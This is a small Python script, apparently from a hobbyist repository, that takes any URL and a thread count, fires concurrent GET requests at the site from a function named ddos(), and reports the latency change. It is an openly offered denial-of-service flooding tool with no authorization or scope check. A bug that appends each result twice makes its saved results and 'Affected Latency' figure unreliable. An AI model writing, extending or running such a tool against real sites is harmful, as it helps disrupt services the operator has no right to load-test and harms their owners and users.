################################################################
#           This Repo Writed By Error                          #
################################################################
import requests, json, threading
from time import sleep
import os
class bcolors:
    OK = '\033[92m' 
    WARNING = '\033[93m' 
    FAIL = '\033[91m' 
    RESET = '\033[0m' 
os.system("clear")
os.system("figlet Error | lolcat")
print(f"{bcolors.WARNING}[INFO] Enter Your Url Like https://example.com")
with open("result.json", "w+") as file:
  json.dump([], file)

i = 0
url = input('URL: ')
thread_count = int(input('Thread count: '))
print()
result = []

def record(value):
  result.append(value)
  if len(result) == thread_count:
    with open("result.json", "w") as file:
      json.dump(result, file)

def resulty(stype):
  with open("result.json", "r") as file:
    data = json.load(file)
  if stype == 0:
    return data[0]
  elif stype == 1:
    return data[-1]
  elif stype == 2:
    diff = str(int(data[-1].strip("ms"))-int(data[0].strip("ms")))+"ms"
    return diff

def ddos():
  global i
  global result
  r = requests.get(url)
  if r.status_code == 200:
    i += 1
    print("#"+str(i), str(int(r.elapsed.total_seconds()*1000))+"ms")
  result.append(str(int(r.elapsed.total_seconds()*1000))+"ms")
  record(result[-1])

threads = []

for a in range(thread_count):
  threads.append(threading.Thread(target=ddos))
  threads[a].start()

sleep(3)

print()
print(f"{bcolors.WARNING}[NIVOS] Done")
print(f"{bcolors.WARNING}[NIVOS] Threads:",i)
print(f"{bcolors.WARNING}[NIVOS] Inital Latency   : ",resulty(0))
print(f"{bcolors.WARNING}[NIVOS] Last Latency     : ",resulty(1))
print(f"{bcolors.WARNING}[NIVOS] Affected Latency : ",resulty(2))
